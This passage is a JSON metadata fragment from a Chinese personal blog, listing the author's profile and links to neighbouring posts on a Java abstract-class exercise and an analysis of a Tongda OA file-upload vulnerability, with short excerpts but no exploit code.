反射型</span></a></li></ol>","author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"Java代码练习之抽象类和接口","uid":"29d2db0c129aae9d00581e94f50e8afb","slug":"Java代码练习之抽象类和接口","date":"2020-04-26T14:38:19.000Z","updated":"2020-04-26T14:55:26.000Z","comments":true,"path":"api/articles/Java代码练习之抽象类和接口.json","keywords":"A1andNS","cover":"https://timgsa.baidu.com/timg?image&quality=80&size=b9999_10000&sec=1584797250934&di=7c8cf327145401b1534a2902f687257f&imgtype=0&src=http%3A%2F%2Fs7.51cto.com%2Fwyfs02%2FM01%2F73%2F3F%2FwKioL1X4zfyRH-yTAABu41grSmY047.jpg","text":"今天写了两题Java练习题 题目一有一个抽象类ObjectVolume，如下所示： abstract class ObjectVolume &#123; abstract double getVolume(); //返回物体的体积 &#125; （1）编写球体类，立方体类和圆柱体...","link":"","photos":[],"count_time":{"symbolsCount":"6k","symbolsTime":"5 mins."},"categories":[{"name":"Java学习","slug":"Java学习","count":6,"path":"api/categories/Java学习.json"}],"tags":[{"name":"Java","slug":"Java","count":6,"path":"api/tags/Java.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"通达OA未授权任意文件上传及文件包含漏洞分析学习","uid":"bcc4c805c00a13a68269e7322cfcb1df","slug":"通达OA未授权任意文件上传及文件包含漏洞分析学习","date":"2020-04-18T01:37:32.000Z","updated":"2020-09-30T04:22:22.000Z","comments":true,"path":"api/articles/通达OA未授权任意文件上传及文件包含漏洞分析学习.json","keywords":"A1andNS","cover":"https://cdn.jsdelivr.net/gh/A1andNS/picgo/img/20200418094130.jpg","text":"今年3月份通达OA爆出了文件上传和文件包含漏洞，网络上很多复现和分析的博客，今天我也来试着分析分析，据360灵腾安全实验室判断该漏洞等级为高，利用难度低，威胁程度高，所以可能比较适合代码审计的新手来练练。 0x00 漏洞概述通达OA（Office Anywhere网络智能办公系统...","link":"","photos":[],"count_time":{"symbolsCount":"5.8k","symbolsTime":"5 mins."},"categories":[{"name":"学习笔记","slug":"学习笔记","count":31,"path":"api/categories/学习笔记.json"}],"tags":[{"name":"漏洞分析","slug":"漏洞分析","count":3,"path":"api/tags/漏洞分析.json"},{"name":"文件上传","slug":"文件上传","count":2,"path":"api/tags/文件上传.json"},{"name":"RCE","slug":"RCE","count":5,"path":"api/tags/RCE.json"},{"name":"代码审计","slug":"代码审计","count":2,"path":"api/tags/代码审计.json"},{"name":"通达OA","slug":"通达OA","count":2,"path":"api/tags/通达OA.json"}],"author":{"name":"沐子龍","slug":"blog-author","avatar":"/svg/head.png","link":"/","description":"爱你所爱，行你所行，听从你心，无问西东","socials":{"github":"https://github.com/A1andNS","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}